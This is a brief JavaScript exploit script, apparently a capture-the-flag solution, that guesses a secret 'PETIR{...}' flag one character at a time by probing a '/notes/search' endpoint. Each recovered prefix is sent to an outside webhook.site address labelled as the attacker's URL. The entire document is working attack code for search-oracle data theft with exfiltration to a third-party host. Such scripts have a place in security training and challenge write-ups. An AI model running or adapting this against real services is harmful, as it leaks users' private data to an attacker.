let flag = 'PETIR{'
const attackerUrl = 'https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6'
const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}_'

async function exploit() {
	while (flag[flag.length - 1] !== '}') {
		let found = false
		for (const char of charset) {
			console.log(`trying ${char}`)
			const res = await fetch(`/notes/search?q=${flag + char}`)
			if (res.ok) {
				flag += char
				found = true
				fetch(`${attackerUrl}?flag=${flag}`)
				break
			}
		}
		if (!found) {
			break
		}
	}
}

exploit()